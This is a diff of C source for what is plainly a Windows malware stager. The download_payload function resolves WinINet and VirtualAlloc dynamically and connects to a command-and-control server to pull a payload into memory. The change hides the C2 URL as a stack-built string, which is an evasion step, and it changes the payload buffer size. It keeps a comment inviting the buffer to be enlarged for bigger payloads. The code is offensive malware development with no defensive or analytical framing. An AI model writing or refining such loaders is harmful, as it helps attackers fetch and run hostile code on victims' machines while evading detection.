@@ -11,7 +11,7 @@ typedef BOOL (WINAPI *pInternetCloseHandle)(HINTERNET);
 typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
 typedef BOOL (WINAPI *pVirtualFree)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
 
-char* download_payload(const char* url, SIZE_T* payload_size) {
+char* download_payload(SIZE_T* payload_size) {
     // load key runtime (in stack)
     LOAD_GLOBAL_KEY(cypher_key, cypher_key_len);
     
@@ -72,16 +72,19 @@ char* download_payload(const char* url, SIZE_T* payload_size) {
 
     if (!hInternet) return NULL;
 
+    // construct C2 URL via stack string
+    C2_URL(c2_url, url_len);
+
     // open connection to C2 server
-    HINTERNET hUrl = fnInternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
+    HINTERNET hUrl = fnInternetOpenUrlA(hInternet, c2_url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
     if (!hUrl) {
         fnInternetCloseHandle(hInternet);
         return NULL;
     }
 
-    // prepare memory buffer to hold payload (36 MB)
+    // prepare memory buffer to hold payload (10 MB)
     // MODIFY: increment buffer size if payload is bigger
-    SIZE_T buffer_size = 36 * 1024 * 1024;
+    SIZE_T buffer_size = 10 * 1024 * 1024;
     
     // use dynamically resolved VirtualAlloc
     char* payload_buffer = (char*) fnVirtualAlloc(NULL, buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
